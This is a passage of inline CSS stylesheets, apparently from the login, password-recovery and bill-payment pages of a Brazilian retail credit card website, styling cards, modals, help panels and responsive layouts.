         .resumo-acordos--warning .circular-chart .chart__svg {
         width: 20px;
         height: 20px; }
         .resumo-acordos--warning .circular-chart .chart__svg {
         -webkit-transform: scaleX(-1);
         transform: scaleX(-1); }
         .resumo-acordos--warning .circular-chart .chart_bar {
         stroke-width: 12px; }
         .resumo-acordos--header {
         -webkit-box-pack: justify;
         justify-content: space-between;
         border-bottom: 3px solid #e0e0e0;
         padding-right: 20px;
         padding-left: 20px; }
         @media (max-width: 767px) {
         .resumo-acordos--header {
         border: none;
         padding-right: 10px;
         padding-left: 10px; } }
         .resumo-acordos--header .text-qntd-mostrando {
         font-size: 12px; }
         .resumo-acordos--header h3 {
         font-size: 20px; }
         .resumo-acordos--toggle {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: center;
         justify-content: center;
         border-top: 1px solid #e0e0e0;
         cursor: pointer;
         height: 38px; }
         .resumo-acordos--toggle p {
         text-transform: uppercase;
         font-size: 12px;
         font-weight: 500; }
         .resumo-acordos--toggle .triangle {
         -webkit-transform: rotate(45deg) translateY(-4px);
         transform: rotate(45deg) translateY(-4px);
         margin-right: 16px;
         border-right: 2px solid red;
         border-bottom: 2px solid red;
         width: 9px;
         height: 9px; }
         .resumo-acordos--toggle .triangle.inverter {
         -webkit-transform: rotate(225deg) translateY(-2px);
         transform: rotate(225deg) translateY(-2px); }
         @media (max-width: 360px) {
         .resumo-acordos .acordo-row .loader {
         margin-left: 8px; } }
         .resumo-acordos .acordo-row .valor-parcela.atraso {
         color: #cf3e3e; }
      </style>
      <style type="text/css">@media (max-width: 767px) {
         .login-dt-nasc .acesso-rapido--title p {
         text-align: center; }
         .login-dt-nasc .acesso-rapido--title h1 {
         margin-bottom: 12px;
         text-align: center;
         font-size: 22px; } }
         .login-dt-nasc__link {
         display: block;
         margin-bottom: 10px; }
         @media (min-width: 768px) {
         .login-dt-nasc .auth-template__help {
         height: 100%; } }
         .login-dt-nasc .auth-template__card-container p {
         margin-bottom: 20px; }
         .login-dt-nasc .duvidas h2 {
         margin-top: 35px;
         margin-bottom: 15px;
         font-size: 20px; }
         @media (max-width: 767px) {
         .login-dt-nasc .duvidas h2 {
         text-align: center;
         font-size: 16px; } }
         .login-dt-nasc .duvidas .title,
         .login-dt-nasc .duvidas .text {
         margin: 0;
         font-size: 16px; }
         @media (max-width: 767px) {
         .login-dt-nasc .duvidas .title,
         .login-dt-nasc .duvidas .text {
         text-align: center;
         font-size: 14px; } }
         .login-dt-nasc .duvidas .title {
         margin-bottom: 8px;
         color: #706f6f;
         font-weight: 700; }
         .login-dt-nasc .duvidas .text {
         margin-bottom: 12px;
         font-weight: 300; }
      </style>
      <style type="text/css">.primeiro-acesso .subtitle {
         display: block;
         margin: 35px 0;
         line-height: 18px;
         color: #706f6f;
         font-size: 14px;
         font-weight: 400; }
         .primeiro-acesso .card__icon__action .back-link {
         display: block;
         margin-top: 20px;
         width: 100%;
         text-align: center; }
         .primeiro-acesso .card__fields {
         color: #706f6f; }
         .lista-facilidades {
         margin-bottom: 50px; }
         .lista-facilidades__item {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         margin-bottom: 25px;
         line-height: 1.2; }
         .lista-facilidades__icone .icon {
         display: inline-block;
         width: 24px;
         height: 24px; }
         .lista-facilidades__texto {
         margin-left: 12px;
         vertical-align: middle;
         font-size: 20px;
         font-weight: 300; }
         .ie .bem-vindo-help .auth-template__help-container {
         width: 100%; }
         @media (min-width: 768px) and (max-width: 1023px) {
         .bem-vindo-help .auth-template__help-container {
         max-width: inherit; }
         .lista-facilidades {
         display: -webkit-box;
         display: flex;
         margin: 50px 0; }
         .lista-facilidades__item {
         display: block;
         -webkit-box-flex: 1;
         flex-grow: 1;
         margin-bottom: 0;
         padding: 0 15px;
         width: 33.33%; }
         .lista-facilidades__icone {
         display: block;
         margin: 0 auto;
         margin-bottom: 20px; }
         .lista-facilidades__icone .icon {
         width: 50px;
         height: 50px; }
         .bem-vindo-medium-box {
         display: block;
         margin: 0 auto;
         width: 340px; } }
         @media (max-width: 767px) {
         .lista-facilidades {
         padding-top: 30px;
         text-align: left; }
         .lista-facilidades__texto {
         margin-left: 10px;
         font-size: 15px; } }
         .bem-vindo .help .help__actions {
         margin-bottom: 50px; }
         .cadastro.form__title p {
         margin-bottom: 0; }
         .cadastro.form__title .step {
         line-height: 22px;
         color: #706f6f;
         font-size: 14px;
         font-weight: 700; }
         .cadastro.form__title .subtitulo {
         margin-top: 20px;
         line-height: 20px;
         color: #1e1e1f;
         font-size: 14px;
         font-weight: 300;
         font-style: italic;
         font-style: normal; }
         .cadastro.form__title .subtitulo--2 {
         margin-top: 20px;
         text-transform: none;
         line-height: 20px;
         color: #706f6f;
         font-size: 14px;
         font-weight: 300;
         font-style: normal; }
         @media (max-width: 767px) {
         .cadastro.form__title {
         display: block;
         margin-top: 30px; } }
         .erro-validacao-senha .request-error,
         .erro-validacao-senha .request-error-icon {
         display: none; }
      </style>
      <style type="text/css">@media (min-width: 768px) {
         .acesso-rapido {
         margin-top: 20px; } }
         @media (max-width: 767px) {
         .acesso-rapido {
         margin-bottom: 20px; } }
         @media (max-width: 1023px) {
         .link-fale-conosco--entrar .link-fale-conosco,
         .link-fale-conosco--senha-cartao .link-fale-conosco {
         margin-top: 20px; } }
      </style>
      <style type="text/css">@media (min-width: 768px) {
         .acesso-rapido {
         margin-top: 20px; } }
         @media (max-width: 767px) {
         .acesso-rapido {
         margin-bottom: 20px; } }
         @media (max-width: 1023px) {
         .link-fale-conosco--entrar .link-fale-conosco,
         .link-fale-conosco--senha-cartao .link-fale-conosco {
         margin-top: 20px; } }
         .modal.modal-sessao-expirada {
         width: 450px; }
         .modal.modal-sessao-expirada .modal__actions .button {
         margin: 0 auto;
         width: 195px; }
         .modal.modal-autocaptacao {
         width: 450px; }
         .modal.modal-autocaptacao .modal__icon {
         width: 100px; }
         .modal.modal-autocaptacao .modal__icon-title {
         color: #d71920; }
         .modal.modal-autocaptacao .autocaptacao-links {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: center;
         justify-content: center; }
         .modal.modal-autocaptacao .autocaptacao-links a {
         color: black; }
         .modal.modal-autocaptacao .autocaptacao-links a:first-child {
         margin-right: 20px; }
         .modal.modal-autocaptacao .autocaptacao-links img {
         width: auto;
         height: 35px; }
         @media (max-width: 767px) {
         .modal.modal-autocaptacao .modal__icon-title {
         font-size: 20px; }
         .modal.modal-autocaptacao .modal__content {
         margin-bottom: 30px;
         font-size: 14px; }
         .modal.modal-autocaptacao .modal__actions svg,
         .modal.modal-autocaptacao .modal__actions img {
         width: 120px; } }
         .modal-bloqueio-acordo .modal__icon-title {
         margin-bottom: 25px; }
         .modal-bloqueio-acordo .modal__content {
         margin-bottom: 40px;
         font-size: 16px; }
         .modal-bloqueio-acordo .modal__content .modal__context-text {
         margin-bottom: 30px; }
         .modal-bloqueio-acordo .modal__content .modal__telefone p {
         margin: 0; }
         .modal-bloqueio-acordo .modal__content .modal__telefone .modal__telefone-title {
         font-style: italic; }
         .modal-bloqueio-acordo .modal__content .modal__telefone .modal__telefone-phone {
         font-weight: 700; }
         .modal-bloqueio-acordo .modal__content .modal__telefone .modal__telefone-phone a {
         text-decoration: none; }
         .modal-bloqueio-acordo .modal__content .modal__telefone .modal__telefone-text {
         color: #706f6f;
         font-size: 12px; }
         .modal-bloqueio-acordo .modal__actions {
         margin: 0 auto;
         width: 195px; }
         .modal-bloqueio-acordo .modal__actions .button {
         width: 100%; }
         card-login .card {
         margin-top: 12px; }
         @media (max-width: 767px) {
         .acesso-rapido {
         margin-bottom: 12px; } }
      </style>
      <style type="text/css">.escolha-fator-seguranca .opcao-fator-seguranca {
         display: -webkit-box;
         display: flex;
         color: #706f6f; }
         .escolha-fator-seguranca .opcao-fator-seguranca input[type="radio"] {
         display: none; }
         .escolha-fator-seguranca .opcao-fator-seguranca .opcao-fator-seguranca__radio {
         display: block;
         -webkit-box-flex: 0;
         flex: 0 0 20px;
         -webkit-transition: all 0.2s ease;
         transition: all 0.2s ease;
         margin-right: 10px;
         border: 1px solid #acacac;
         border-radius: 100%;
         background-color: #fff;
         width: 20px;
         height: 20px; }
         .escolha-fator-seguranca .opcao-fator-seguranca .opcao-fator-seguranca__info {
         overflow: hidden;
         text-overflow: ellipsis; }
         .escolha-fator-seguranca .opcao-fator-seguranca:not(.opcao-fator-seguranca--disabled) {
         cursor: pointer; }
         .escolha-fator-seguranca .opcao-fator-seguranca.opcao-fator-seguranca--disabled .opcao-fator-seguranca__radio {
         border: 1px solid #e0e0e0; }
         .escolha-fator-seguranca .opcao-fator-seguranca.opcao-fator-seguranca--disabled .opcao-fator-seguranca__info {
         color: #acacac; }
         .escolha-fator-seguranca .opcao-fator-seguranca.opcao-fator-seguranca--selected .opcao-fator-seguranca__radio {
         position: relative; }
         .escolha-fator-seguranca .opcao-fator-seguranca.opcao-fator-seguranca--selected .opcao-fator-seguranca__radio:after {
         position: absolute;
         top: 50%;
         left: 50%;
         -webkit-transform: translateX(-50%) translateY(-50%);
         transform: translateX(-50%) translateY(-50%);
         background-color: #3ecf7a;
         content: "";
         border-radius: 50%;
         width: 12px;
         height: 12px; }
         .escolha-fator-seguranca .opcao-fator-seguranca:not(:last-child) {
         margin-bottom: 30px; }
      </style>
      <style type="text/css">.card.card-icon .card-icon-action--full-width {
         display: -webkit-box;
         display: flex;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column; }
         .card.card-icon .card-icon-action--full-width > * {
         -webkit-box-flex: 1;
         flex: 1;
         margin-bottom: 20px; }
         .card.card-icon .card-icon-action--full-width > *:last-child {
         margin-bottom: 0; }
         .card.card-icon .card-icon-action--full-width .card-icon-action__link {
         text-align: center; }
         .ie .card.card-icon .card-icon-action--full-width > * {
         -webkit-box-flex: 0;
         flex: none; }
      </style>
      <style type="text/css">.senha-expirada .card {
         padding-bottom: 10px; }
         .senha-expirada .senha-expirada__greetings h1 {
         margin: 0; }
         .senha-expirada .senha-expirada__regras {
         display: block; }
         .senha-expirada .senha-expirada__regras .password-tips__title,
         .senha-expirada .senha-expirada__regras .password-tips__items {
         color: #1e1e1f; }
         .senha-expirada .senha-expirada__regras .password-tips__items {
         font-size: 12px; }
         .senha-expirada .senha-expirada__regras .password-tips__title {
         margin-bottom: 10px;
         font-size: 16px;
         font-weight: 700; }
      </style>
      <style type="text/css">.modal.modal-login,
         .modal.modal-entrar {
         min-width: 725px; }
         .modal.modal-login .modal__content,
         .modal.modal-entrar .modal__content {
         margin: 0; }
         .modal.modal-login card-section,
         .modal.modal-entrar card-section {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: justify;
         justify-content: space-between; }
         .modal.modal-login .card,
         .modal.modal-entrar .card {
         width: 320px; }
         .modal.modal-entrar {
         min-width: 840px; }
         @media (max-width: 767px) {
         .modal.modal-login,
         .modal.modal-entrar {
         padding: 0;
         width: 100%;
         min-width: unset; }
         .modal.modal-login card-section,
         .modal.modal-entrar card-section {
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column; }
         .modal.modal-login .card,
         .modal.modal-entrar .card {
         width: 300px; }
         .modal.modal-entrar .card .card__title {
         margin: 10px; }
         .modal.modal-entrar .card .card__subtitle {
         margin-bottom: 20px; }
         .modal.modal-entrar .help {
         display: none; }
         .modal.modal-entrar ul.virtual-keyboard {
         padding: 0; }
         .modal.modal-entrar .request-error-container {
         margin-bottom: 10px; }
         .modal.modal-entrar .card__links__recaptcha,
         .modal.modal-entrar .card__links__recuperacao {
         font-size: 12px; } }
         @media (min-width: 1024px) and (max-width: 1600px) {
         .modal.modal-entrar {
         padding-top: 0;
         padding-bottom: 0; }
         .modal.modal-entrar .card {
         margin-top: 20px;
         padding: 20px 20px 30px; }
         .modal.modal-entrar .card__links__recaptcha,
         .modal.modal-entrar .card__links__recuperacao {
         margin-bottom: 0;
         font-size: 11px; } }
         @media (min-width: 768px) and (max-width: 1023px) {
         .modal.modal-entrar {
         width: 100%;
         min-width: unset; }
         .modal.modal-entrar help-login {
         width: 35%; } }
      </style>
      <style type="text/css">.fator-seguranca-validar-codigo .card__title {
         margin-bottom: 35px; }
         .fator-seguranca-validar-codigo p.card__links__confirmar-codigo {
         margin-top: 30px;
         margin-bottom: 0; }
         .fator-seguranca-validar-codigo p.card__links__confirmar-codigo.mensagem-aguarde {
         color: #706f6f; }
      </style>
      <style type="text/css">.confirmar-codigo .captcha-viewer-on {
         margin-bottom: 10px; }
         .confirmar-codigo p.card__links__recuperacao {
         margin-top: 30px;
         margin-bottom: 0; }
         .confirmar-codigo p.card__links__recuperacao.mensagem-aguarde {
         color: #706f6f; }
         .confirmar-codigo a.card__links__recuperacao {
         color: #1e1e1f; }
         .list-tips {
         margin: 50px 0 130px;
         font-size: 20px;
         font-weight: 300; }
         .card-title-text {
         margin-top: 20px;
         margin-bottom: 10px; }
         .readonly-email .input-hint,
         .readonly-sms .input-hint {
         margin-bottom: 0;
         margin-left: 30px;
         color: #acacac;
         font-size: 12px; }
         .readonly-email input.textfield__input.textfield__input--blocked,
         .readonly-sms input.textfield__input.textfield__input--blocked {
         text-transform: lowercase;
         color: #1e1e1f;
         font-weight: 700; }
         .readonly-email .textfield.textfield--with-icon {
         padding: 0; }
         .readonly-email .textfield.textfield--with-icon .textfield__icon {
         top: 15%; }
         .readonly-sms .input-hint {
         margin: 0;
         margin-bottom: 15px;
         font-size: 14px; }
         .readonly-sms .input-warning {
         color: #cf3e3e;
         font-size: 12px; }
         .list-tips__item {
         position: relative;
         margin-bottom: 60px;
         padding-left: 30px;
         list-style: none; }
         .list-tips__item p {
         position: relative;
         letter-spacing: -0.5px;
         font-size: 18px; }
         .list-tips__item:nth-child(1):before {
         display: inline-block;
         position: absolute;
         bottom: -6px;
         left: 0;
         z-index: 0;
         line-height: 100%;
         color: #ebebeb;
         font-size: 100px;
         font-weight: 900;
         content: "1"; }
         .list-tips__item:nth-child(2):before {
         display: inline-block;
         position: absolute;
         bottom: -6px;
         left: 0;
         z-index: 0;
         line-height: 100%;
         color: #ebebeb;
         font-size: 100px;
         font-weight: 900;
         content: "2"; }
         .list-tips__item:nth-child(3):before {
         display: inline-block;
         position: absolute;
         bottom: -6px;
         left: 0;
         z-index: 0;
         line-height: 100%;
         color: #ebebeb;
         font-size: 100px;
         font-weight: 900;
         content: "3"; }
         .recuperacao-senha-cadastro .card__fields {
         margin: 0 0 15px; }
         @media (min-width: 768px) and (max-width: 1023px) {
         .recuperacao-senha-enviado-help .auth-template__help-container {
         max-width: inherit; }
         .recuperacao-senha-enviado-help .help {
         margin-top: 100px; }
         .recuperacao-senha-enviado-help .greetings__prefix {
         font-weight: 700; }
         .recuperacao-senha-enviado-help .list-tips {
         display: -webkit-box;
         display: flex;
         margin: 50px 0 0; }
         .recuperacao-senha-enviado-help .list-tips__item:before {
         top: -15px;
         bottom: inherit;
         font-size: 135px; } }
         @media (min-width: 768px) {
         .auth-template__card .card.card-icon.card-icon--success {
         border: 0; } }
         @media (max-width: 767px) {
         .recuperacao-senha-cadastro .auth-template__card {
         margin: 50px 0 0; } }
      </style>
      <style type="text/css">.auth-shell {
         overflow-x: hidden; }
         .auth-template {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: center;
         justify-content: center; }
         .auth-template .auth-template__help,
         .auth-template .auth-template__card,
         .auth-template .auth-template__support {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center; }
         .auth-template .auth-template__card {
         z-index: 2; }
         .auth-template .auth-template__card-container {
         width: 340px; }
         @media (min-width: 1024px) and (min-height: 769px) {
         .auth-template {
         min-height: 80vh; } }
         @media (min-width: 1024px) and (max-height: 768px) {
         .auth-template {
         min-height: 90vh; } }
         @media (min-width: 1024px) {
         .ie .auth-template {
         height: 0;
         min-height: 680px; }
         .auth-template .auth-template__help {
         -webkit-box-pack: center;
         justify-content: center; }
         .auth-template .auth-template__card {
         -webkit-box-pack: center;
         justify-content: center; }
         .auth-template .auth-template__card-container {
         margin: 0 15px;
         width: 370px; } }
         @media (max-width: 1023px) {
         .ie .auth-template {
         height: auto; }
         .ie .auth-template__help,
         .ie .auth-template__card,
         .ie .auth-template__support {
         -webkit-box-flex: 0;
         flex: 0 0 auto; }
         .auth-template {
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         margin-bottom: 60px;
         height: auto; }
         .auth-template .auth-template__help,
         .auth-template .auth-template__card,
         .auth-template .auth-template__support {
         flex-basis: auto;
         -webkit-box-pack: center;
         justify-content: center; }
         .auth-template .auth-template__support {
         display: none; }
         .auth-template .auth-template__card {
         width: 100%; } }
         @media (min-width: 1024px) {
         .auth-template__support {
         position: relative; }
         .auth-template__support-container {
         width: 100%;
         height: 100%;
         background-position-y: -50px; }
         .safari .auth-template__support-container {
         height: 90vh; } }
         .help__arrow span {
         display: block;
         position: relative;
         background-color: #d71920;
         width: 56px;
         height: 1px; }
         .help__arrow span:before, .help__arrow span:after {
         display: block;
         position: absolute;
         right: 0;
         background-color: #d71920;
         width: 5px;
         height: 1px;
         content: ""; }
         .help__arrow span:before {
         top: -2px;
         -webkit-transform: rotate(45deg);
         transform: rotate(45deg); }
         .help__arrow span:after {
         top: 2px;
         -webkit-transform: rotate(-45deg);
         transform: rotate(-45deg); }
         @media (max-width: 767px) {
         .auth-template .auth-template__card card-section .card {
         border: 5px solid #1e1e1f;
         padding: 25px; }
         .auth-template .auth-template__card-container {
         width: unset; }
         .bloqueio .card {
         margin-top: 50px; } }
         @media (min-width: 1024px) {
         .auth-template .auth-template__help.auth-template__help--top {
         -webkit-box-align: start;
         align-items: flex-start; } }
         @media (max-width: 1023px) {
         .auth-template__help--mobile-after {
         -webkit-box-ordinal-group: 3;
         order: 2; } }
         .textfield-bullets .textfield__label {
         top: 0;
         color: #706f6f;
         font-size: 13px; }
      </style>
      <style type="text/css">.card-icon .card-icon__block {
         margin: 20px 0; }
         .card-icon .card-icon__icon div {
         display: block;
         margin: 0 auto 10px;
         width: 60px;
         height: 60px; }
         .card-icon .card-icon__title {
         text-align: center;
         line-height: 26px;
         font-size: 24px;
         font-weight: bold; }
         .card-icon .card-icon__text {
         display: block;
         text-align: center;
         line-height: 19px;
         color: #706f6f;
         font-size: 16px;
         font-weight: 400;
         font-style: normal; }
         .card-icon .card-icon__action {
         margin-top: 30px; }
         .card-icon p {
         margin: 0; }
         .card-icon.card-icon--error .card-icon__block {
         color: #cf3e3e; }
         .card-icon.card-icon--error .card-icon__icon .card-icon__icon-for-success {
         display: none; }
         .card-icon.card-icon--success .card-icon__block {
         color: #3ecf7a; }
         .card-icon.card-icon--success .card-icon__icon .card-icon__icon-for-error {
         display: none; }
         .card-icon.card-icon--info .card-icon__block {
         color: #1e1e1f; }
         .card-icon.card-icon--info .card-icon__icon .card-icon__icon-for-success {
         display: none; }
         .card-icon.card-icon--info .card-icon__icon div {
         -webkit-transform: rotate(-180deg);
         transform: rotate(-180deg); }
         .card-icon.card-icon--pending .card-icon__icon .card-icon__icon-for-error,
         .card-icon.card-icon--pending .card-icon__icon .card-icon__icon-for-success {
         display: none; }
      </style>
      <style type="text/css">.card {
         margin: 30px 0 15px;
         border: 5px solid #1e1e1f;
         background-color: #fff;
         padding: 30px 30px 40px; }
         .card .card__title {
         margin-bottom: 20px;
         line-height: 100%;
         color: #1e1e1f;
         font-size: 24px;
         font-weight: 900; }
         .card .card__subtitle {
         margin-bottom: 30px;
         text-align: center;
         line-height: 110%;
         letter-spacing: -0.05rem;
         color: #706f6f;
         font-size: 20px; }
         .card .card__subtitle strong {
         color: #1e1e1f; }
         .card .card__links {
         margin-top: 20px;
         text-align: center; }
         .card.card--no-border {
         border: none; }
         .card-actions {
         text-align: center; }
         @media (max-width: 767px) {
         .card {
         margin-top: 0;
         border: 0;
         padding: 0 8px; }
         .card .card__title {
         text-align: center;
         font-size: 18px; }
         .card .card__subtitle {
         font-size: 16px; }
         .card .card__links {
         margin-bottom: 20px; } }
         @media (min-width: 1024px) {
         .card .card__title span {
         display: block; }
         .card-actions {
         display: none; } }
      </style>
      <style type="text/css"></style>
      <style type="text/css">.greetings {
         line-height: 34px;
         letter-spacing: -0.05rem; }
         .greetings .greetings__prefix {
         margin-bottom: 5px;
         font-size: 36px;
         font-weight: 700; }
         .greetings .greetings__name {
         font-size: 36px;
         font-weight: 700; }
         .greetings .greetings__name strong {
         font-weight: inherit; }
         @media (max-width: 767px) {
         .greetings .greetings__prefix,
         .greetings .greetings__name {
         font-size: 24px; } }
         @media (min-width: 1024px) {
         .greetings .greetings__prefix {
         display: block; } }
      </style>
      <style type="text/css">.auth-template__help--empty {
         -webkit-box-align: start;
         align-items: flex-start; }
         @media (min-width: 1024px) {
         .help-empty__background {
         position: absolute;
         top: 0;
         left: 0;
         width: 650px;
         height: 948px; }
         .sem-cartao .help-empty__background {
         background: url(/cartoes-renner/images/mancha.jpg) no-repeat top left; }
         .meu-cartao .help-empty__background {
         background: url(/cartoes-renner/images/mancha-meu-cartao.jpg) no-repeat top left; }
         .cartao-renner .help-empty__background {
         background: url(/cartoes-renner/images/mancha-cartao-renner.jpg) no-repeat top left; } }
      </style>
      <style type="text/css">.help .help__logo .help__logo-title {
         text-transform: uppercase;
         line-height: 30px;
         color: #1e1e1f;
         font-size: 33px;
         font-weight: 900; }
         .help .help__text {
         text-align: center;
         color: #1e1e1f;
         font-size: 18px;
         font-weight: 300; }
         .help .help__text .greetings {
         margin-bottom: 32px; }
         .help .help__text p {
         font-size: 18px;
         font-weight: 300; }
         .help .help__image {
         margin: 25px 0; }
         .help .help__image .help__image-icon {
         display: block;
         margin: 20px 0;
         width: 162px;
         height: auto; }
         .help .help__arrow {
         display: none; }
         .help .help__actions {
         display: none; }
         @media (max-width: 767px) {
         .help {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         flex-wrap: wrap;
         -webkit-box-pack: center;
         justify-content: center;
         margin-top: 30px; } }
         @media (max-width: 767px) and (min-width: 350px) {
         .help {
         padding: 0 14px; } }
         @media (max-width: 767px) {
         .help .help__logo {
         margin-right: 20px; }
         .help .help__logo .help__logo-title {
         text-align: left;
         line-height: 24px;
         font-size: 24px; }
         .help .help__image {
         display: -webkit-box;
         display: flex;
         margin: 0;
         text-align: center; }
         .help .help__image .help__image-icon {
         display: inline-block;
         margin: 0;
         width: 68px;
         height: auto; }
         .help .help__image .help__image-icon:first-child {
         margin-right: 20px; }
         .help .help__text {
         flex-basis: 100%;
         -webkit-box-ordinal-group: 2;
         order: 1;
         margin-top: 10px;
         margin-bottom: 10px;
         letter-spacing: -0.03rem;
         font-size: 16px; }
         .help .help__text .greetings {
         margin-bottom: 20px; }
         .help .help__text p {
         font-size: 14px; } }
         @media (min-width: 768px) and (max-width: 1023px) {
         .help .help__logo {
         text-align: center; }
         .help .help__image .help__image-icon {
         display: inline-block; } }
         @media (min-width: 768px) {
         .help {
         margin-top: 50px; } }
         @media (min-width: 1024px) {
         .help .help__text {
         text-align: left; }
         .help .help__image {
         margin: 35px 0; }
         .help .help__arrow {
         display: block;
         margin-top: 35px; }
         .help .help__actions {
         display: block;
         margin-top: 80px;
         line-height: 20px; } }
      </style>
      <style type="text/css">.nao-sou-eu {
         text-decoration: underline;
         line-height: 20px; }
      </style>
      <style type="text/css">.recaptcha-viewer {
         font-size: 14px; }
      </style>
      <style type="text/css">.app-lojas-renner {
         background-image: url(../vectors/bg-login.svg);
         padding-top: 35px;
         text-align: center; }
         .app-lojas-renner h2 {
         margin-bottom: 10px;
         width: 100%;
         text-transform: uppercase; }
         .app-lojas-renner h3 {
         font-weight: bold; }
         .app-lojas-renner__subtitle {
         margin-bottom: 60px;
         width: 100%;
         text-transform: uppercase; }
         .app-lojas-renner__texto {
         margin: 0 60px;
         max-width: 350px; }
         .app-lojas-renner__conteudo {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: center;
         justify-content: center; }
         .app-lojas-renner__descricao {
         margin-bottom: 75px; }
         .app-lojas-renner__badges {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: center;
         justify-content: center;
         width: 100%; }
         .app-lojas-renner__badges a:first-child {
         margin-right: 22px; }
         @media (max-width: 767px) {
         .app-lojas-renner h2 {
         margin: 0;
         font-size: 20px; }
         .app-lojas-renner h3 {
         font-size: 16px; }
         .app-lojas-renner__subtitle {
         margin: 0; }
         .app-lojas-renner__conteudo {
         flex-wrap: wrap; }
         .app-lojas-renner__texto {
         margin: 0; }
         .app-lojas-renner__descricao {
         margin: 15px 45px 35px; }
         .app-lojas-renner__image {
         margin-top: 50px;
         padding-left: 70px; } }
      </style>
      <style type="text/css">.confirmar-codigo .captcha-viewer-on {
         margin-bottom: 10px; }
         .confirmar-codigo p.card__links__recuperacao {
         margin-top: 30px;
         margin-bottom: 0; }
         .confirmar-codigo p.card__links__recuperacao.mensagem-aguarde {
         color: #706f6f; }
         .confirmar-codigo a.card__links__recuperacao {
         color: #1e1e1f; }
      </style>
      <style type="text/css">.excesso-tentativas div.card__title {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: center;
         justify-content: center; }
         .excesso-tentativas div.card__title span.card-title-text {
         display: initial;
         text-align: center; }
         .excesso-tentativas p.hint {
         text-align: center;
         font-size: 16px; }
         .excesso-tentativas .card-title-text,
         .excesso-tentativas .icon {
         color: #cf3e3e;
         width: 60px;
         height: 60px; }
      </style>
      <style type="text/css">.linha-digitavel-selectable__space:before {
         -webkit-user-select: none;
         -moz-user-select: none;
         -ms-user-select: none;
         user-select: none;
         content: " "; }
         .linha-digitavel-selectable__dot:before {
         -webkit-user-select: none;
         -moz-user-select: none;
         -ms-user-select: none;
         user-select: none;
         content: "."; }
         .modal-linha-digitavel .modal__icon,
         .modal-linha-digitavel .modal__icon-title {
         color: #3ecf7a; }
         .modal-linha-digitavel .modal__content {
         margin-bottom: 0; }
         .modal-linha-digitavel .modal-linha-digitavel__texto {
         font-weight: 300; }
         .modal-linha-digitavel .modal-linha-digitavel__codigo {
         font-weight: 400; }
         .modal-linha-digitavel--error .modal__icon {
         display: block;
         margin: auto;
         margin-bottom: 20px;
         color: #cf3e3e;
         width: 60px;
         height: 60px; }
         .modal-linha-digitavel--error .modal__icon-title {
         margin-bottom: 30px;
         text-align: center;
         letter-spacing: -0.03em;
         color: #cf3e3e;
         font-size: 24px;
         font-weight: 700; }
         .modal-linha-digitavel--error .modal-linha-digitavel__texto {
         text-align: center;
         line-height: 21px;
         color: #706f6f;
         font-size: 16px;
         font-weight: 400; }
         .modal-linha-digitavel--error .modal-linha-digitavel__texto strong {
         color: #1e1e1f; }
         .modal-linha-digitavel--error .modal__content {
         margin-bottom: 0; }
         .modal-linha-digitavel--error .modal-telefones {
         margin-top: 30px; }
         .modal-linha-digitavel--error .modal-telefones .row {
         text-align: left; }
         .modal-linha-digitavel--error .modal-telefones .modal-telefones__titulo {
         text-align: center;
         letter-spacing: -0.03em;
         color: #1e1e1f;
         font-size: 16px;
         font-weight: 400;
         font-style: italic; }
         .modal-linha-digitavel--error .modal-telefones .modal-telefones__telefone {
         margin: 0;
         letter-spacing: -0.04em;
         color: #1e1e1f;
         font-size: 16px;
         font-weight: 700; }
         .modal-linha-digitavel--error .modal-telefones .modal-telefones__telefone a {
         text-decoration: none; }
         .modal-linha-digitavel--error .modal-telefones .modal-telefones__texto {
         margin: 0;
         line-height: 13px;
         letter-spacing: -0.01em;
         color: #1e1e1f;
         font-size: 12px;
         font-weight: 400; }
         .modal-boleto {
         width: 460px; }
         .modal-boleto .modal__icon,
         .modal-boleto .modal__icon-title {
         color: #3ecf7a; }
         .modal-boleto .modal__content {
         margin-bottom: 0; }
         .modal-boleto .modal__mensagem-informativa {
         margin-top: 20px; }
         .modal-boleto .modal__mensagem-informativa.modal__mensagem-informativa--com-encargos mensagem-informativa:first-child .mensagem-informativa {
         border-bottom: 0;
         border-radius: 3px 3px 0 0; }
         .modal-boleto .modal__mensagem-informativa.modal__mensagem-informativa--com-encargos mensagem-informativa:last-child .mensagem-informativa {
         border-top: 0;
         border-radius: 0 0 3px 3px; }
         .modal-boleto .modal-boleto__texto {
         font-weight: 300; }
         .modal-boleto .modal__actions {
         display: -webkit-box;
         display: flex;
         flex-flow: wrap; }
         @media only screen and (max-width: 580px) {
         .modal-boleto .modal__actions > * {
         margin-right: 5px; } }
         .modal-boleto .modal__actions .button:nth-child(2) {
         margin-right: 0; }
         .modal-boleto .modal__actions .button:nth-child(3) {
         flex-basis: 100%;
         margin-top: 12px; }
         .modal-boleto .modal__actions .button .icon-button {
         float: left;
         margin-top: 10px;
         width: 18px;
         height: 18px; }
         .modal-boleto .valores {
         display: -webkit-box;
         display: flex;
         position: relative;
         -webkit-box-orient: horizontal;
         -webkit-box-direction: normal;
         flex-direction: row;
         -webkit-box-pack: justify;
         justify-content: space-between;
         margin: 20px 0; }
         .modal-boleto .valores .property__label {
         line-height: 21px;
         color: #1e1e1f;
         font-size: 16px;
         font-weight: 300; }
         .modal-boleto .valores .arrow {
         position: absolute;
         top: 0;
         right: 0;
         bottom: 0;
         left: -2px;
         margin: auto;
         border-top: 2px solid #1e1e1f;
         border-radius: 5px;
         width: 15px;
         height: 0; }
         .modal-boleto .valores .arrow:before {
         position: absolute;
         top: -6px;
         right: 0;
         -webkit-transform: rotate(45deg);
         transform: rotate(45deg);
         border: 2px solid #1e1e1f;
         border-bottom: 0;
         border-left: 0;
         border-radius: 1px;
         width: 10px;
         height: 10px;
         content: ""; }
         .modal-boleto .valores .parcela {
         text-align: left; }
         .modal-boleto .valores .parcela .holder {
